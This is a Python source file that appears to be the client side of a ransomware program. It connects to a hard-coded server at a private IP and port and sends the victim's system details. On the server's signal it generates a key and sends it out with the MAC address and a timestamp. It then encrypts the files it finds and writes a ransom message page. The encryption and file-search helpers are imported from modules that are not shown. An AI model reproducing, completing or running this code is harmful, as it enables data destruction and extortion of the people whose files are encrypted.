#import modules
import os
import random
import socket
import json;
import uuid
from datetime import datetime


# Import other files
from utils.system_info import *
from utils.encrypt import *
from utils.dir_methods import *
from utils.html_prepare import *


# define constants
SERVER_IP = "192.168.3.144";
SERVER_PORT = 5678;


def main():
    # create and maintain socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    
        # connect with server
        s.connect((SERVER_IP,SERVER_PORT));
        
        s.send("0".encode('utf-8'))
    
        # Get target system information ,encode and send it
        system_information = get_target_system_information();
        s.send(json.dumps(system_information,indent=2).encode('utf-8'));
    
        # Check Server attack response
        attack_status = s.recv(1024);
        
        # Negative on attack
        if(attack_status.decode('utf-8') == '0'):
            s.close();
            
        else:
            encryption_key = generate_rsa_key();
            attack_time = str(datetime.now());
            target_mac = hex(uuid.getnode());
        
            system_information.update({
                'encryption_key': encryption_key,
                'attack_timestamp' : attack_time ,
                'target_mac': target_mac,
            });
            s.send(json.dumps(system_information,indent=2).encode('utf-8'));
            
            # wait for key saved response
            key_saved_status = s.recv(1024);
            
            if key_saved_status.decode('utf-8') == '0':
                print("Key Saving Issue");
                s.close()
                
            else:
                all_files_path  =find_files_path();
                prepare_encrypt_file(all_files_path,encryption_key);
                
                # prepare html
                write_message();
                
    
main()
